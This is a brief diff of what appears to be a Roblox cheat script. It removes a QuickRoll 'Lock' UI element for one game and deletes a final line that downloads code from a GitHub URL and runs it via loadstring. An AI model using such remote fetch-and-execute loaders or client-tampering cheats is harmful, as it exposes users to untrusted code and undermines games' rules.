@@ -50,5 +50,3 @@ if game.PlaceId == 16556777270 then
         game:GetService("Players").cheweweee.PlayerGui.Menu.Roll.Frame.QuickRoll.Lock:Remove()
     end)
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zatrix12/name./main/source"))()
